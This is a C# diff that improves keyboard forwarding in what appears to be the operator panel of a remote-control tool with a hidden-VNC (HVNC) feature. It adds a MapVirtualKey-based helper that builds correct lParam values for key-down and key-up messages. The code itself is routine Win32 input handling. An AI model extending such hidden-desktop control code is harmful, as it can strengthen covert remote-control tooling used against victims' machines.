@@ -15,6 +15,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 using Pulsar.Common.Messages.Monitoring.HVNC;
 
 namespace Pulsar.Server.Forms
@@ -675,7 +676,7 @@ namespace Pulsar.Server.Forms
 
             uint message = 0x0100; // WM_KEYDOWN
             int wParam = (int)e.KeyCode;
-            int lParam = 1; // Key down
+            int lParam = BuildKeyboardLParam(e.KeyCode, false); // false = key down
 
             _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
         }
@@ -686,7 +687,7 @@ namespace Pulsar.Server.Forms
 
             uint message = 0x0101; // WM_KEYUP
             int wParam = (int)e.KeyCode;
-            int lParam = unchecked((int)0xC0000001); // Key up with repeat count
+            int lParam = BuildKeyboardLParam(e.KeyCode, true); // true = key up
 
             _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
         }
@@ -710,5 +711,78 @@ namespace Pulsar.Server.Forms
                 Path = "Discord"
             });
         }
+
+        #region Win32 API and Helper Methods
+
+        [DllImport("user32.dll")]
+        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+        /// <summary>
+        /// Builds the appropriate lParam value for keyboard messages.
+        /// </summary>
+        /// <param name="keyCode">The Windows Forms key code</param>
+        /// <param name="isKeyUp">True if this is a key up event, false for key down</param>
+        /// <returns>The properly formatted lParam for the keyboard message</returns>
+        private int BuildKeyboardLParam(Keys keyCode, bool isKeyUp)
+        {
+            int vk = (int)keyCode;
+            uint scanCode = MapVirtualKey((uint)vk, 0); // MAPVK_VK_TO_VSC = 0
+            
+            int lParam = 0;
+            
+            lParam |= 1;
+            
+            lParam |= (int)(scanCode << 16);
+            
+            if (IsExtendedKey(vk))
+            {
+                lParam |= (1 << 24);
+            }
+            
+            if (isKeyUp)
+            {
+                lParam |= (1 << 30);
+                lParam |= (1 << 31);
+            }
+            
+            return lParam;
+        }
+
+        /// <summary>
+        /// Determines if a virtual key code represents an extended key.
+        /// </summary>
+        /// <param name="virtualKey">The virtual key code</param>
+        /// <returns>True if the key is an extended key</returns>
+        private bool IsExtendedKey(int virtualKey)
+        {
+            switch (virtualKey)
+            {
+                case (int)Keys.Prior:      // Page Up
+                case (int)Keys.Next:       // Page Down
+                case (int)Keys.End:        // End
+                case (int)Keys.Home:       // Home
+                case (int)Keys.Left:       // Left arrow
+                case (int)Keys.Up:         // Up arrow
+                case (int)Keys.Right:      // Right arrow
+                case (int)Keys.Down:       // Down arrow
+                case (int)Keys.Insert:     // Insert
+                case (int)Keys.Delete:     // Delete
+                case (int)Keys.LWin:       // Left Windows
+                case (int)Keys.RWin:       // Right Windows
+                case (int)Keys.Apps:       // Menu
+                case (int)Keys.LShiftKey:  // Left Shift (when differentiated)
+                case (int)Keys.RShiftKey:  // Right Shift
+                case (int)Keys.LControlKey: // Left Control
+                case (int)Keys.RControlKey: // Right Control
+                case (int)Keys.LMenu:      // Left Alt
+                case (int)Keys.RMenu:      // Right Alt
+                case (int)Keys.Scroll:     // Scroll Lock
+                    return true;
+                default:
+                    return false;
+            }
+        }
+
+        #endregion
     }
 }
